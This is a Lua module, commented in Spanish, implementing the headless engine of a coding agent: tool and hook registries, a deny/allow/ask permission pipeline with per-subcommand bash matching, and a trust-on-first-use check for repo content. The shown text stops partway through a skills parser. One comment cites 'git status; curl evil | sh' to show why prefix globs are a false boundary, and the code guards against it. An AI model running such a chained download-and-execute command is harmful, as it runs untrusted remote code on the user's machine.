-- Módulo público de la extensión `agent` (S39): el motor headless.
--
-- Implementa el contrato de [agente.md](../../../../../docs/agente.md):
--
--   §2 El TURNO (`Session:send`): anexa el mensaje del usuario, ensambla el
--      request canónico (§7), lo pasa por hooks `request.pre`, llama al adaptador
--      (`stream`), consume el stream canónico de Events (providers.md §2.3:
--      text/thinking/tool_call.*/usage/done) re-emitiéndolos en el bus
--      (`agent:delta`), persiste el mensaje del `done`, y si `stop_reason ==
--      "tool_calls"` ejecuta cada tool en orden (permisos → tool.pre → handler →
--      tool.post → tool_result) y VUELVE a pedir; termina cuando el modelo para
--      sin tools o se agota `max_turns`.
--   §3 Registro de TOOLS (`agent.tool`): nombre, descripción, schema, handler.
--   §4 HOOKS: notificaciones por el bus `enu.events` (`agent:*`, con atribución
--      obligatoria `session`, G3) y MIDDLEWARE por registro propio (`agent.hook`,
--      puntos `request.pre`/`tool.pre`/`tool.post`/`permission`/`compact`).
--   §5 PERMISOS: pipeline `deny` → `allow` → hooks `permission` → ask/headless;
--      en headless (sin `enu.ui`, `enu.has("ui")`=false, G20) y sin respuesta:
--      default DENY con error ACCIONABLE (nombra el patrón a añadir).
--   §10 Configuración (`agent.toml`): modelo por defecto, `max_turns`, permisos.
--
-- ADR-003: el core NO sabe lo que es un agente; todo es Lua puro sobre la API
-- pública (api.md) + las extensiones `providers`/`sessions`. Código de error de
-- la extensión: `EAGENT` (forma de los del core, api.md §1.4 / ADR-009).

local providers = require("providers")
local sessions = require("sessions")

local M = {}

-- max_turns por defecto (agente.md §2 paso 6 / §10): protección contra loops del
-- modelo. Una sesión puede subirlo/bajarlo por `opts.max_turns`.
local DEFAULT_MAX_TURNS = 32

-- Reintentos de la apertura del stream por defecto (G42, agente.md §2/§10): ante un
-- error transitorio del provider (429/5xx/cortes de red que el adaptador marca
-- `detail.retryable`) el motor reintenta con backoff exponencial
-- `retry_base_ms · 2^(intento−1)`: 1 s → 2 s → 4 s con los defaults. Precedencia
-- estándar de §10 (opts > agent.toml > default), igual que `max_turns`.
local DEFAULT_MAX_RETRIES = 3
local DEFAULT_RETRY_BASE_MS = 1000

-- ---------------------------------------------------------------------------
-- Errores estructurados de la extensión (EAGENT, agente.md / ADR-009).
-- ---------------------------------------------------------------------------

local function eagent(message, detail)
  error({ code = "EAGENT", message = message, detail = detail })
end

local function einval(message)
  error({ code = "EINVAL", message = message })
end

-- ---------------------------------------------------------------------------
-- Eventos `agent:*` por el bus del core (agente.md §4 notificaciones).
-- ---------------------------------------------------------------------------

-- Atribución obligatoria (G3, agente.md §4): TODO payload `agent:*` lleva
-- `session` (id de la sesión emisora). El campo se pone en un ÚNICO sitio (este
-- helper) para no olvidarlo nunca. El bus es el del core (`enu.events`), namespace
-- `agent:` (el del plugin, no reserva del core, ADR-003).
local function emit(session_id, name, payload)
  payload = payload or {}
  payload.session = session_id
  enu.events.emit("agent:" .. name, payload)
end

-- ---------------------------------------------------------------------------
-- Registro de TOOLS (agente.md §3).
-- ---------------------------------------------------------------------------

-- Registro vivo (en memoria) de tools por nombre. Hay UN ÚNICO registro para todo
-- el proceso (agente.md §9: "un solo registro de tools; ninguna se duplica en
-- versión worker"). Lo llenan las tools básicas (init.lua) y cualquier extensión
-- (MCP en S41) con `agent.tool`.
local tools = {}

-- agent.tool{ name, description, schema, handler, permissions? } (agente.md §3).
-- Registra una tool. `handler(args, ctx) ⏸ -> string|Block[]|tabla`. Un
-- re-registro del mismo nombre lo SUSTITUYE (un plugin puede pisar una oficial).
-- `permissions.default` ("ask"|"allow"|"deny") fija la política base de la tool:
-- las de solo lectura se registran con "allow" (agente.md §5 amortiguador 1).
function M.tool(spec)
  if type(spec) ~= "table" then
    einval("agent.tool espera una tabla { name, description, schema, handler, permissions? }")
  end
  if type(spec.name) ~= "string" or spec.name == "" then
    einval("agent.tool: `name` debe ser una cadena no vacía")
  end
  if type(spec.handler) ~= "function" then
    einval(string.format("agent.tool %q: `handler` debe ser una función (args, ctx) -> resultado", spec.name))
  end
  local default = "ask"
  if spec.permissions ~= nil then
    if type(spec.permissions) ~= "table" then
      einval(string.format("agent.tool %q: `permissions` debe ser una tabla { default = ... }", spec.name))
    end
    if spec.permissions.default ~= nil then
      local d = spec.permissions.default
      if d ~= "ask" and d ~= "allow" and d ~= "deny" then
        einval(string.format("agent.tool %q: permissions.default debe ser \"ask\", \"allow\" o \"deny\"", spec.name))
      end
      default = d
    end
  end
  tools[spec.name] = {
    name        = spec.name,
    description = spec.description or "",
    schema      = spec.schema or { type = "object" },
    handler     = spec.handler,
    default     = default,
  }
end

-- M.tools() -> {name, description, schema}[] enumera las tools registradas (para
-- ensamblar el request, §7, y para introspección). Copia defensiva (sin handler).
function M.tools()
  local out = {}
  for _, t in pairs(tools) do
    out[#out + 1] = { name = t.name, description = t.description, schema = t.schema }
  end
  return out
end

-- ---------------------------------------------------------------------------
-- HOOKS-MIDDLEWARE (agente.md §4): registro PROPIO, NO el bus de eventos.
-- ---------------------------------------------------------------------------

-- Puntos de hook v1 (agente.md §4): cada uno con una lista de { fn, priority,
-- seq } ordenable. `request.pre` muta el request; `tool.pre` veta/reescribe args;
-- `tool.post` reescribe el resultado; `permission` concede/deniega; `compact`.
local HOOK_POINTS = {
  ["request.pre"] = true,
  ["tool.pre"]    = true,
  ["tool.post"]   = true,
  ["permission"]  = true,
  ["compact"]     = true,
}

local hooks = {}        -- point -> { {fn, priority, seq, live}, ... }
local hook_seq = 0      -- desempate estable: orden de registro

-- agent.hook(point, fn, opts?) -> Hook (agente.md §4). Registra un middleware.
-- `fn(payload, ctx)` devuelve nil (no opina), un payload sustituto (sigue con él)
-- o `{ deny = "razón" }` (corta la cadena; el primer deny gana). Orden: priority
-- ascendente, luego orden de registro. `Hook:remove()` lo desregistra.
function M.hook(point, fn, opts)
  if not HOOK_POINTS[point] then
    einval(string.format("agent.hook: punto %q desconocido (v1: request.pre, tool.pre, tool.post, permission, compact)", tostring(point)))
  end
  if type(fn) ~= "function" then
    einval("agent.hook: el segundo argumento debe ser una función (payload, ctx) -> nil|payload|{deny}")
  end
  opts = opts or {}
  hook_seq = hook_seq + 1
  local entry = { fn = fn, priority = opts.priority or 0, seq = hook_seq, live = true }
  hooks[point] = hooks[point] or {}
  table.insert(hooks[point], entry)
  return {
    remove = function()
      entry.live = false
    end,
  }
end

-- run_hooks(point, payload, ctx) corre la cadena de middleware de `point` sobre
-- `payload` (agente.md §4). Devuelve:
--   - el payload (posiblemente sustituido por algún hook) si nadie deniega;
--   - nil + razón si algún hook devolvió `{ deny = "razón" }` (el PRIMER deny
--     gana y corta la cadena).
-- Cada hook corre bajo `pcall` (frontera robusta, ADR-008): un hook que lanza se
-- loguea y se ignora (no opina), la cadena sigue. Itera sobre una COPIA ordenada
-- por (priority, seq) tomada al entrar (cancelar a mitad no rompe el recorrido;
-- los `live=false` se saltan).
local function run_hooks(point, payload, ctx)
  local list = hooks[point]
  if not list or #list == 0 then
    return payload, nil
  end
  local ordered = {}
  for _, e in ipairs(list) do
    if e.live then
      ordered[#ordered + 1] = e
    end
  end
  table.sort(ordered, function(a, b)
    if a.priority ~= b.priority then
      return a.priority < b.priority
    end
    return a.seq < b.seq
  end)
  for _, e in ipairs(ordered) do
    if e.live then
      local ok, res = pcall(e.fn, payload, ctx)
      if not ok then
        enu.log.warn("agent: hook %q lanzó y se ignora: %s", point,
          (type(res) == "table" and res.message) or tostring(res))
      elseif type(res) == "table" and res.deny ~= nil then
        return nil, tostring(res.deny)
      elseif res ~= nil then
        payload = res -- sustituye y sigue
      end
    end
  end
  return payload, nil
end

-- Limpieza del registro de hooks (para tests deterministas y `reload`). No es
-- parte del contrato público pero es inofensivo y útil.
function M._reset_hooks()
  hooks = {}
  hook_seq = 0
end

-- ---------------------------------------------------------------------------
-- Paquetes de caps con nombre (agente.md §9): vocabulario de ESTA extensión.
-- ---------------------------------------------------------------------------

-- Tablas Lua normales e inspeccionables (agente.md §9): el vocabulario de
-- permisos-duros (caps de worker, G6) vive aquí; el mecanismo (sandbox por caps)
-- en el core. Los subagentes (S40) las usarán para recortar la API de su worker.
M.caps = {
  FS_RO   = { "fs.read", "fs.stat", "fs.list", "fs.cwd" },
  FS_RW   = { "fs" },
  SEARCH  = { "search" },
  NET     = { "http", "ws" },
}

-- ---------------------------------------------------------------------------
-- PERMISOS (agente.md §5).
-- ---------------------------------------------------------------------------

-- La semántica de emparejamiento es CONTRATO, no detalle (G53, agente.md §5,
-- [ADR-023]). Un patrón sin `:` casa por NOMBRE EXACTO de la tool (`"edit"` casa
-- la tool `edit` y ninguna otra; no hay glob sobre nombres). Un patrón
-- `tool:argumento` casa por GLOB ANCLADO sobre la representación textual del
-- argumento principal: `*` ⇒ `.*`, el resto de caracteres literales, y el patrón
-- debe casar el argumento COMPLETO (`^…$`) — `bash:git *` no casa `git` a secas
-- ni `mygit status`.
local function glob_to_pattern(glob)
  -- Escapa los mágicos de Lua salvo `*`, que pasa a `.*` (glob → patrón Lua),
  -- y ancla a los extremos: el patrón debe casar el argumento COMPLETO.
  local out = glob:gsub("[%^%$%(%)%%%.%[%]%+%-%?]", "%%%1"):gsub("%*", ".*")
  return "^" .. out .. "$"
end

-- match_pattern(pattern, tool_name, arg_text) -> bool. El emparejamiento GENERAL
-- (todas las tools SALVO `bash`, que se descompone aparte): nombre exacto sin
-- `:`; glob anclado sobre `arg_text` con `:`.
local function match_pattern(pattern, tool_name, arg_text)
  local colon = pattern:find(":", 1, true)
  if not colon then
    return pattern == tool_name
  end
  local p_tool = pattern:sub(1, colon - 1)
  if p_tool ~= tool_name then
    return false
  end
  local p_arg = pattern:sub(colon + 1)
  if not p_arg:find("*", 1, true) then
    return p_arg == (arg_text or "")
  end
  return (arg_text or ""):match(glob_to_pattern(p_arg)) ~= nil
end

-- Emparejamiento de `bash` POR SUBCOMANDO (G53, agente.md §5, ADR-023). El glob
-- crudo sobre el string entero del comando sería una FRONTERA FALSA (SEC-02):
-- `allow = { "bash:git *" }` autorizaría de facto `bash:*`, porque basta
-- encadenar (`git status; curl evil | sh`) para que el prefijo casado arrastre un
-- comando arbitrario. Por eso el comando se DESCOMPONE por operadores y `allow`
-- concede solo si CADA subcomando casa algún patrón.

-- decompose_bash(cmd) -> { subcomando, ... } | nil. Tokeniza `cmd` con el modelo
-- CERRADO POR CONTRATO — palabras planas y strings entre comillas simples o
-- dobles — y lo parte por los separadores reconocidos (`&&`, `||`, `;`, `|&`,
-- `|`, `&` y saltos de línea, todos fuera de comillas) en una lista de
-- subcomandos (con trim, sin vacíos). Devuelve nil (FAIL-CLOSED) ante cualquier
-- constructo NO MODELABLE: sustitución de comandos (`$( )`, backticks —también
-- dentro de comillas dobles, donde bash las sigue ejecutando—), expansión `$VAR`
-- en POSICIÓN DE COMANDO, redirecciones (`<`, `>`), heredocs, subshells y
-- agrupaciones (`( )`, `{ }`), o comillas desbalanceadas. La lista de constructos
-- modelables es un ALLOWLIST: lo que el tokenizador no entiende cae a `ask`,
-- nunca a conceder (doctrina de P17; el salto a un parser de shell completo queda
-- pospuesto en P39). Ampliar esta lista es un cambio de CONTRATO, no de código.
local function decompose_bash(cmd)
  local subs = {}
  local buf = {}                 -- caracteres del subcomando en curso
  local i, n = 1, #cmd
  local in_squote = false        -- dentro de '...'
  local in_dquote = false        -- dentro de "..."
  local cmd_word = false         -- ¿empezó ya la primera palabra del subcomando?
  local cmd_word_done = false    -- ¿terminó la primera palabra (hubo espacio tras ella)?

  -- Cierra el subcomando en curso: trim y descarte de vacíos (un separador al
  -- final, o `;;`, no crea un subcomando fantasma).
  local function push_sub()
    local s = table.concat(buf):gsub("^%s+", ""):gsub("%s+$", "")
    if s ~= "" then subs[#subs + 1] = s end
    buf = {}
    cmd_word = false
    cmd_word_done = false
  end

  while i <= n do
    local c = cmd:sub(i, i)
    if in_squote then
      -- Comillas simples: literal absoluto en bash — ni escapes ni expansión;
      -- solo `'` cierra. Un separador aquí dentro NO parte (`echo 'a; b'` es uno).
      if c == "'" then in_squote = false end
      buf[#buf + 1] = c
      i = i + 1
    elseif in_dquote then
      -- Comillas dobles: `\` escapa el siguiente char, `"` cierra, y `$( )`/
      -- backticks SIGUEN ejecutando dentro → no modelables (el resto —`$VAR`,
      -- `${VAR}`— es literal opaco para el glob).
      if c == "\\" then
        buf[#buf + 1] = c
        if i < n then buf[#buf + 1] = cmd:sub(i + 1, i + 1) end
        i = i + 2
      elseif c == "`" then
        return nil               -- sustitución con backticks (ejecuta en dobles)
      elseif c == "$" and cmd:sub(i + 1, i + 1) == "(" then
        return nil               -- $( ) command substitution (ejecuta en dobles)
      else
        if c == '"' then in_dquote = false end
        buf[#buf + 1] = c
        i = i + 1
      end
    else
      -- Fuera de comillas: aquí viven los separadores y los constructos no
      -- modelables. El orden importa: los operadores de dos caracteres antes que
      -- los de uno.
      if c == "\\" then
        -- Escape: el siguiente char es literal (no separa ni abre comillas). Sin
        -- esto, un `\"` engañaría al rastreador de comillas y podría tragarse un
        -- separador — bajo-rechazo peligroso.
        cmd_word = true
        buf[#buf + 1] = c
        if i < n then buf[#buf + 1] = cmd:sub(i + 1, i + 1) end
        i = i + 2
      elseif c == "'" then
        in_squote = true; cmd_word = true; buf[#buf + 1] = c; i = i + 1
      elseif c == '"' then
        in_dquote = true; cmd_word = true; buf[#buf + 1] = c; i = i + 1
      elseif c == "\n" or c == ";" then
        push_sub(); i = i + 1                       -- separador: salto de línea / `;`
      elseif c == "&" then
        if cmd:sub(i + 1, i + 1) == "&" then i = i + 1 end
        push_sub(); i = i + 1                       -- `&&` o `&` (background)
      elseif c == "|" then
        local nx = cmd:sub(i + 1, i + 1)
        if nx == "|" or nx == "&" then i = i + 1 end
        push_sub(); i = i + 1                       -- `||`, `|&` o `|`
      elseif c == "`" then
        return nil                                  -- sustitución con backticks
      elseif c == "(" or c == ")" or c == "{" or c == "}" then
        return nil                                  -- subshell/agrupación (y `$( )`, `${ }`)
      elseif c == "<" or c == ">" then
        return nil                                  -- redirección / heredoc
      elseif c == "$" and not cmd_word_done then
        return nil                                  -- `$VAR` en posición de comando
      else
        if c:match("%s") then
          if cmd_word then cmd_word_done = true end -- fin de la primera palabra
        else
          cmd_word = true
        end
        buf[#buf + 1] = c; i = i + 1
      end
    end
  end

  if in_squote or in_dquote then
    return nil                    -- comillas desbalanceadas
  end
  push_sub()
  return subs
end

-- match_bash(list, cmd, require_all) -> patrón | nil. Aplica la semántica por
-- subcomando a la lista de política. `require_all` = true (allow) concede solo si
-- CADA subcomando casa algún patrón `bash:arg` de la lista; false (deny) casa si
-- ALGÚN subcomando casa. Un patrón `bash` a secas (sin `:`, nombre exacto de la
-- tool) cubre CUALQUIER comando y cortocircuita. Ante un comando no modelable
-- devuelve nil: allow no concede (fail-closed) y deny —best-effort, doctrina
-- G16— no puede inspeccionar subcomandos, así que la petición sigue el pipeline
-- (ask; en headless, deny), nunca hacia conceder.
local function match_bash(list, cmd, require_all)
  -- `bash` a secas casa la tool entera: cortocircuita (nombre exacto).
  for _, pat in ipairs(list or {}) do
    if pat == "bash" then return "bash" end
  end
  -- Recoge los globs anclados de los patrones `bash:arg`.
  local globs = {}
  for _, pat in ipairs(list or {}) do
    local colon = pat:find(":", 1, true)
    if colon and pat:sub(1, colon - 1) == "bash" then
      globs[#globs + 1] = { pat = pat, rx = glob_to_pattern(pat:sub(colon + 1)) }
    end
  end
  if #globs == 0 then return nil end

  local subs = decompose_bash(cmd or "")
  if subs == nil or #subs == 0 then return nil end  -- no modelable / vacío

  if require_all then
    -- allow: CADA subcomando debe casar algún glob. Devuelve un patrón que casó.
    local hit = nil
    for _, s in ipairs(subs) do
      local ok = false
      for _, g in ipairs(globs) do
        if s:match(g.rx) then ok = true; hit = hit or g.pat; break end
      end
      if not ok then return nil end
    end
    return hit or globs[1].pat
  else
    -- deny: ALGÚN subcomando que case basta (precedencia absoluta en el pipeline).
    for _, s in ipairs(subs) do
      for _, g in ipairs(globs) do
        if s:match(g.rx) then return g.pat end
      end
    end
    return nil
  end
end

-- match_policy(list, tool_name, atext, require_all) -> patrón | nil. Despacha
-- entre la descomposición por subcomando de `bash` y el emparejamiento general
-- del resto de tools.
local function match_policy(list, tool_name, atext, require_all)
  if tool_name == "bash" then
    return match_bash(list, atext, require_all)
  end
  for _, pat in ipairs(list or {}) do
    if match_pattern(pat, tool_name, atext) then return pat end
  end
  return nil
end

-- suggested_for(tool_name, atext) -> string | { string, ... }. El/los patrón(es)
-- `allow` accionables (amortiguador 2 de §5, portador `suggested` de G40). Para un
-- `bash` COMPUESTO (≥2 subcomandos) devuelve una LISTA con un patrón por
-- subcomando — la UX de "permitir siempre" persiste reglas por subcomando, no el
-- string encadenado (P29): reutilizables y auditables una a una. Un bash de un
-- solo subcomando, un bash no modelable, o cualquier otra tool devuelven el
-- string `tool:arg` de siempre.
local function suggested_for(tool_name, atext)
  if tool_name == "bash" and atext ~= "" then
    local subs = decompose_bash(atext)
    if subs and #subs >= 2 then
      local out = {}
      for _, s in ipairs(subs) do out[#out + 1] = "bash:" .. s end
      return out
    elseif subs and #subs == 1 then
      return "bash:" .. subs[1]
    end
    -- no modelable: cae al string entero de abajo.
  end
  if atext ~= "" then
    return tool_name .. ":" .. atext
  end
  return tool_name
end

-- arg_text(tool_name, args) -> string. Representación textual de los args para
-- casar patrones `tool:argumento` (agente.md §5). Para una tool `bash` el
-- argumento natural es el comando; para el resto, un campo `path`/`command`/`cmd`
-- si lo hay, o vacío. Es heurístico pero suficiente para los patrones v1.
local function arg_text(tool_name, args)
  if type(args) ~= "table" then
    return ""
  end
  return tostring(args.command or args.cmd or args.path or args.file or "")
end

-- policy_decision(perms, tool_name, atext) -> verdict, patrón?. El núcleo de la
-- política DECLARADA (los dos primeros pasos del pipeline de §5): `deny` corta,
-- luego `allow` concede. Devuelve "deny"+patrón, "allow", o "pass" (ni una ni
-- otra: sigue a hooks/ask/headless). Extraído de check_permission para que los
-- tests de G53 ejerciten la semántica de emparejamiento table-driven sin montar
-- una sesión entera.
local function policy_decision(perms, tool_name, atext)
  -- deny casa si ALGÚN subcomando casa (bash) o el glob general (resto).
  local denied = match_policy(perms.deny, tool_name, atext, false)
  if denied then return "deny", denied end
  -- allow concede si CADA subcomando casa (bash) o el glob general (resto).
  if match_policy(perms.allow, tool_name, atext, true) then return "allow" end
  return "pass"
end

-- Ganchos de prueba (no forman parte del contrato público, cf. `M._reset_hooks`):
-- exponen la maquinaria de emparejamiento de G53 para tests table-driven que
-- blindan la MISMA función que corre el pipeline.
M._policy_decision = policy_decision
M._decompose_bash = decompose_bash
M._suggested_for = suggested_for

-- pending_asks: asks pendientes por id, cada uno con su `future` (G3: varias
-- sesiones pueden tener asks a la vez; cada una espera SIN timeout). La UI/chat
-- responde con `agent.permission.respond(id, granted)`.
local pending_asks = {}
local ask_seq = 0

M.permission = {}

-- agent.permission.respond(id, granted) responde a un ask pendiente (agente.md
-- §5). `granted` true concede, false/nil deniega. Lo llama la UI (chat, S43) tras
-- pintar el diálogo de `agent:permission.asked`. Sin id válido → no-op silencioso
-- (el ask pudo expirar al cancelarse el turno).
function M.permission.respond(id, granted)
  local p = pending_asks[id]
  if p == nil then
    return
  end
  pending_asks[id] = nil
  p.future:set(granted == true)
end

-- agent.permission.persist_allow(pattern) añade `pattern` a la política GLOBAL del
-- usuario (`config.dir()/agent.toml`, sección [permissions].allow) — el destino
-- de "permitir siempre con modificador" (chat.md §5, P29). NUNCA al agent.toml del
-- repo: sus `allow` se ignoran por el modelo de confianza (agente.md §11). Lee,
-- fusiona (sin duplicar) y reescribe el TOML; invalida la caché de config.
function M.permission.persist_allow(pattern)
  if type(pattern) ~= "string" or pattern == "" then
    einval("agent.permission.persist_allow espera un patrón (string no vacío)")
  end
  local path = enu.config.dir() .. "/agent.toml"
  local cfg = {}
  local ok, raw = pcall(enu.fs.read, path)
  if ok and type(raw) == "string" and raw ~= "" then
    local okd, decoded = pcall(enu.toml.decode, raw)
    if okd and type(decoded) == "table" then cfg = decoded end
  end
  cfg.permissions = cfg.permissions or {}
  cfg.permissions.allow = cfg.permissions.allow or {}
  for _, p in ipairs(cfg.permissions.allow) do
    if p == pattern then
      return -- ya estaba
    end
  end
  cfg.permissions.allow[#cfg.permissions.allow + 1] = pattern
  enu.fs.mkdir(enu.config.dir())
  enu.fs.write(path, enu.toml.encode(cfg))
  M.reload_config() -- la próxima sesión releerá la política global
end

-- check_permission(session, tool, args) decide si una tool call puede ejecutarse
-- (agente.md §5). Pipeline:
--   1. la tool de solo lectura con default="allow" se concede directa (amortig. 1);
--   2. `deny` de la política (corta): denegado;
--   3. `allow` de la política (concede);
--   4. hooks `permission` (pueden conceder/denegar programáticamente);
--   5. nadie decidió:
--        - default de la tool = "deny" → denegado;
--        - mode = "auto" → concedido (explícito y ruidoso, amortiguador 3);
--        - mode = "ask" Y hay UI (`enu.has("ui")`, G20) → se emite
--          `agent:permission.asked` y se ESPERA la respuesta (future, sin timeout);
--        - mode = "ask" SIN UI (headless, CI) → DEFAULT DENY (agente.md §5).
-- Devuelve true (concedido) o (false, razon_accionable, denial). La razón nombra
-- el patrón EXACTO a añadir (amortiguador 2): "denegado `bash:npm install`; añade
-- allow = {\"bash:npm *\"}". `denial` es el objeto estructurado de G40 — la prosa
-- es PRESENTACIÓN, no el portador: { tool, source, pattern?, suggested? } (el
-- llamante le añade id/args); source ∈ "deny"|"hook"|"default"|"headless"|"user".
local function check_permission(session, tool, args)
  local perms = session.permissions
  local name = tool.name
  local atext = arg_text(name, args)

  -- 1. Solo lectura declarada: nunca pide (agente.md §5 amortiguador 1).
  if tool.default == "allow" then
    return true
  end
  -- Una tool con default="deny" se deniega salvo allow explícito (se evalúa abajo).

  -- 2-3. Política declarada (agente.md §5: deny → allow → hooks). deny corta con
  -- precedencia absoluta; allow concede. Para `bash`, deny casa si ALGÚN
  -- subcomando casa y allow solo si CADA subcomando casa (un constructo no
  -- modelable cae fail-closed y no concede) — el núcleo vive en policy_decision.
  local verdict, denied = policy_decision(perms, name, atext)
  if verdict == "deny" then
    return false, string.format("permiso denegado por `deny = {%q}` para la tool %q", denied, name),
      { tool = name, source = "deny", pattern = denied }
  elseif verdict == "allow" then
    return true
  end

  -- 4. hooks `permission` (conceden/deniegan programáticamente). El payload lleva
  -- la tool y los args; un hook devuelve `{ deny = razon }` para denegar, o un
  -- payload con `grant = true` para conceder.
  local payload, deny_reason = run_hooks("permission",
    { tool = name, args = args, arg_text = atext }, { session = session.handle })
  if deny_reason ~= nil then
    return false, string.format("permiso denegado por un hook `permission`: %s", deny_reason),
      { tool = name, source = "hook" }
  end
  if type(payload) == "table" and payload.grant == true then
    return true
  end

  -- 5. Nadie decidió. El/los patrón(es) ACCIONABLE(s) a añadir (amortiguador 2).
  -- Para un `bash` compuesto, `suggested` es una LISTA por subcomando (P29); la
  -- prosa `action` usa una representación textual del primero de esos patrones.
  local suggested = suggested_for(name, atext)
  local action_pat = type(suggested) == "table" and (suggested[1] or name) or suggested
  local action = string.format("denegado %q; concédelo con allow = {%q} (o ejecuta con --auto-permissions)", name, action_pat)

  if tool.default == "deny" then
    return false, "la tool está registrada con default = \"deny\"; " .. action,
      { tool = name, source = "default", suggested = suggested }
  end

  if perms.mode == "auto" then
    return true -- modo auto explícito y ruidoso (amortiguador 3)
  end

  -- mode = "ask". En headless (sin UI, G20) no hay quien responda: default DENY.
  -- Este es el `suggested` del bucle de escalado de la ronda 8: denegación →
  -- enmienda de la política → re-run.
  if not enu.has("ui") then
    return false, "permiso requerido en modo headless (sin UI): " .. action,
      { tool = name, source = "headless", suggested = suggested }
  end

  -- Hay UI: se pregunta y se ESPERA la respuesta (future, sin timeout, G3).
  ask_seq = ask_seq + 1
  local id = "ask-" .. session.handle.id .. "-" .. ask_seq
  local fut = enu.task.future()
  pending_asks[id] = { future = fut, session = session.handle.id }
  emit(session.handle.id, "permission.asked", { id = id, tool = name, args = args, suggested = suggested })
  local granted = fut:await()
  if granted then
    return true
  end
  return false, "permiso denegado por el usuario: " .. action,
    { tool = name, source = "user", suggested = suggested }
end

-- ---------------------------------------------------------------------------
-- Configuración (agente.md §10).
-- ---------------------------------------------------------------------------

-- load_config() -> tabla lee `config.dir()/agent.toml` (agente.md §10) de forma
-- perezosa y cacheada. Ausente → defaults. Mal formado → EAGENT accionable. Solo
-- lee los campos v1 que esta sesión usa: `model`, `max_turns`, `max_retries`,
-- `retry_base_ms` (reintentos de la apertura del stream, G42), `permissions`.
local config_cache = nil
local function load_config()
  if config_cache ~= nil then
    return config_cache
  end
  local path = enu.config.dir() .. "/agent.toml"
  local ok, raw = pcall(enu.fs.read, path)
  if not ok then
    if type(raw) == "table" and raw.code == "ENOENT" then
      config_cache = {}
      return config_cache
    end
    error(raw)
  end
  local okd, decoded = pcall(enu.toml.decode, raw)
  if not okd then
    eagent(string.format("agent.toml mal formado (%s): %s", path,
      (type(decoded) == "table" and decoded.message) or tostring(decoded)))
  end
  config_cache = decoded or {}
  return config_cache
end

-- M.reload_config() invalida la caché de `agent.toml`.
function M.reload_config()
  config_cache = nil
end

-- normalize_permissions(opts_perms, cfg) -> Permissions. Combina los permisos de
-- la sesión (`opts.permissions`) con los globales de `agent.toml` (agente.md §10:
-- defaults < global < sesión). El repo solo recorta (agente.md §11) — fuera del
-- alcance de S39, que no lee `.enu/agent.toml`; se documenta para S45.
local function normalize_permissions(opts_perms, cfg)
  local global = (cfg and cfg.permissions) or {}
  local sess = opts_perms or {}
  local function concat(a, b)
    local out = {}
    for _, v in ipairs(a or {}) do out[#out + 1] = v end
    for _, v in ipairs(b or {}) do out[#out + 1] = v end
    return out
  end
  return {
    mode  = sess.mode or global.mode or "ask",
    allow = concat(global.allow, sess.allow),
    deny  = concat(global.deny, sess.deny),
  }
end

-- normalize_thinking(value) -> { mode, budget? } | nil. Normaliza la opción de
-- razonamiento de la sesión (control de razonamiento del agente, ADR-016) a la
-- forma canónica del request (providers.md §2.1). Acepta:
--   - una tabla `{ mode?, budget? }` (la forma canónica);
--   - una cadena de modo ("off"|"adaptive"|"budget") como atajo;
--   - `{ budget = N }` sin mode → "budget" (compat con la firma vieja del canónico).
-- Devuelve nil para "off" / ausente (sin razonamiento: el request no lleva
-- `thinking`). El DIALECTO por-modelo no se decide aquí: es dato del providers.toml
-- que el adaptador traduce (ADR-016) — la sesión solo elige el modo.
local function normalize_thinking(value)
  if value == nil then
    return nil
  end
  local mode, budget
  if type(value) == "string" then
    mode = value
  elseif type(value) == "table" then
    mode, budget = value.mode, value.budget
  else
    einval("thinking debe ser una tabla { mode?, budget? } o una cadena de modo")
  end
  if mode == nil and type(budget) == "number" then
    mode = "budget" -- compat: { budget = N } sin mode
  end
  if mode == nil or mode == "off" then
    return nil
  end
  if mode ~= "adaptive" and mode ~= "budget" then
    einval('thinking.mode debe ser "off", "adaptive" o "budget"')
  end
  local out = { mode = mode }
  if type(budget) == "number" then
    out.budget = budget
  end
  return out
end

-- ---------------------------------------------------------------------------
-- System prompt (agente.md §7).
-- ---------------------------------------------------------------------------

local BASE_SYSTEM = "Eres un agente de codificación que opera sobre un repositorio mediante tools."

-- ---------------------------------------------------------------------------
-- Confianza del contenido del repo: TOFU (agente.md §11.2, P24).
-- ---------------------------------------------------------------------------

-- El contenido que el repo aporta al MODELO (`.enu/skills/`, `enu.md`) es de un
-- tercero (§11): solo se inyecta tras un sí explícito, recordado por repo en
-- `data_dir/trust.json`. Sin decisión afirmativa (incluido headless), no se
-- inyecta. El contenido del USUARIO (`config.dir()/skills/`) es suyo: confiable.

-- La clave por repo reusa la codificación cwd→slug de la extensión sessions,
-- que desde G38 es parte del formato y su única fuente Lua de verdad
-- (sesiones.md §2) — antes vivía aquí un duplicado literal.
local function trust_slug(cwd)
  return sessions.slug(cwd)
end

local function trust_path()
  return enu.config.data_dir() .. "/trust.json"
end

local trust_cache = nil
local function load_trust()
  if trust_cache ~= nil then
    return trust_cache
  end
  local ok, raw = pcall(enu.fs.read, trust_path())
  if ok and type(raw) == "string" and raw ~= "" then
    local okd, decoded = pcall(enu.json.decode, raw)
    if okd and type(decoded) == "table" then
      trust_cache = decoded
      return trust_cache
    end
  end
  trust_cache = {}
  return trust_cache
end

M.trust = {}

-- agent.trust.is_trusted(cwd) -> true|false|nil. nil = sin decidir (la UI debe
-- preguntar, §11.2); true/false = recordado.
function M.trust.is_trusted(cwd)
  local v = load_trust()[trust_slug(cwd)]
  if v == nil then return nil end
  return v == true
end

-- agent.trust.set(cwd, trusted) recuerda la decisión TOFU por repo (persistida).
function M.trust.set(cwd, trusted)
  local t = load_trust()
  t[trust_slug(cwd)] = (trusted == true)
  trust_cache = t
  pcall(function()
    enu.fs.mkdir(enu.config.data_dir())
    enu.fs.write(trust_path(), enu.json.encode(t))
  end)
end

-- agent.trust.has_repo_content(cwd) -> bool. ¿El repo trae algo inyectable
-- (`.enu/skills/` o `enu.md`)? Es lo que decide si hay que disparar el TOFU (§11.2):
-- si no hay contenido, no se pregunta nada.
function M.trust.has_repo_content(cwd)
  if enu.fs.stat(cwd .. "/enu.md") ~= nil then return true end
  if enu.fs.stat(cwd .. "/.enu/skills") ~= nil then return true end
  return false
end

-- ---------------------------------------------------------------------------
-- Skills (agente.md §6, P24): descubrimiento + índice + tool `skill`.
-- ---------------------------------------------------------------------------

-- split_skill_md(content) -> meta, body. Parte un SKILL.md en su frontmatter YAML
-- (`name`, `description`) y su cuerpo. Compatible con el formato del ecosistema
-- (frontmatter entre `---`), decodificado con `enu.yaml` (api.md §12).
local function split_skill_md(content)
  local fm, body = content:match("^%-%-%-%s*\r?\n(.-)\r?\n%-%-%-%s*\r?\n(.*)$")
  if fm == nil then
